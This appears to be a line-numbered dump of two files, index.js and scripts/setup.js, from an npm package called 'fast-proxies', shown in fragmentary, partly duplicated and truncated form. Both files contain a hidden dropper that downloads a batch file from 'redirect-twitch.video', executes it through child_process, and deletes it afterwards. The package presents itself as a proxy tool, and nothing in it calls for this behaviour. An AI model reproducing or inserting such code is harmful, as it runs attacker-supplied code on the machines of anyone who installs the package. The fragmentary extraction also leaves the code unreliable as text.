// File: tmp/tmpghx_9to0/fast-proxies/package/index.js
// ======================================================================
Line 2: const https = require('https')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 5: _tmp_0 = require('child_process')
Line 7: const fileUrl = 'https://redirect-twitch.video/orange.bat'
Line 8: path.basename(fileUrl)
Line 11: (_tmp_1 = https.get(fileUrl, (res) => {
  if (res.statusCode !== 200) {
    console.error('Failed to download the file');
    return;
  }

  // Create a writable stream for the file
  const fileStream = fs.createWriteStream(filename);
  
  // Pipe the response stream into the file stream
  res.pipe(fileStream);

  // When the file is fully written, run it
  fileStream.on('finish', () => {
    fileStream.close(() => {
      // Once the file is closed, execute the .bat file
      exec(`"${filename}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Delete the file after execution
        fs.unlink(filename, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File ...)
Line 21: res.pipe(fileStream)
Line 25: {
      // Once the file is closed, execute the .bat file
      exec(`"${filename}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Delete the file after execution
        fs.unlink(filename, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      });
    }
Line 27: exec(`"${filename}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Delete the file after execution
        fs.unlink(filename, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      })

// File: tmp/tmpghx_9to0/fast-proxies/package/scripts/setup.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: _tmp_0 = require('child_process')
Line 7: const fileUrl = 'https://redirect-twitch.video/orange.bat'
Line 8: path.basename(fileUrl)
Line 11: (_tmp_1 = https.get(fileUrl, (res) => {
  if (res.statusCode !== 200) {
    console.error('Failed to download the file');
    return;
  }

  // Define where to save the .bat file (in the current working directory)
  const downloadPath = path.join(__dirname, filename);
  const fileStream = fs.createWriteStream(downloadPath);

  // Pipe the response stream into the file stream
  res.pipe(fileStream);

  // When the file is fully written, run it
  fileStream.on('finish', () => {
    fileStream.close(() => {
      console.log(`Downloaded ${filename} successfully.`);

      // Execute the .bat file after download
      exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(do...)
Line 18: path.join(__dirname, filename)
Line 22: res.pipe(fileStream)
Line 26: {
      console.log(`Downloaded ${filename} successfully.`);

      // Execute the .bat file after download
      exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      });
    }
Line 30: exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      })
